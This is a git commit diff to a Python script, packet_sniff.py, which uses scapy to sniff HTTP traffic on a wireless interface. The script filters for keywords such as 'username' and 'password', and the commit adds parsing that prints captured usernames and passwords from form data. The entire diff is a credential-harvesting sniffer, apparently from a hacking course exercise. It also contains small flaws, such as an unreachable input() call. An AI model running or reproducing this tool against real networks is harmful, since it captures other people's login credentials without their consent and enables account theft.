afa1f0f367f6e4fa502b94e37e10daa9d3249190
Adithiya86 <adithiya8686@gmail.com>
2022-12-29 23:30:28 +0530

    2nd packet_sniff

--- packet_sniff.py
+++ packet_sniff.py
@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-#gdbfg
 import scapy.all as scapy
 from scapy.layers import http
 
@@ -14,17 +13,34 @@ def get_login_info(packet):
             load= packet[scapy.Raw].load
             keywords =["uname","username","login","user","pass","password"]
             for keyword in keywords:
-                if keyword in str(load):  
+                if bytes(keyword,"utf-8") in load:
                     return load
+
+def convert_dict(string):
+    try:
+        convertedDict = {}
+        for data in string.decode("utf-8").split("&"):
+            data = data.split("=")
+            convertedDict.update({data[0]:data[1]})
+        return convertedDict
+        input('--------')
+    except AttributeError:
+        pass
+
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print("[+] HTTP Request >> ",url)
         login_info = get_login_info(packet)
+        login_info = convert_dict(login_info)
         if login_info:
-            print("\n\n[+] possible usrename/password",login_info,"\n\n")
-        
+            # print("\n\n[+] possible usrename/password",login_info,"\n\n")
+            print("\n\n[*] possible usrename :",login_info.get("uname"))
+            print("[*] possible password :",login_info.get("pass"),"\n\n")
+
+
+
 sniff("wlan0")
 
 
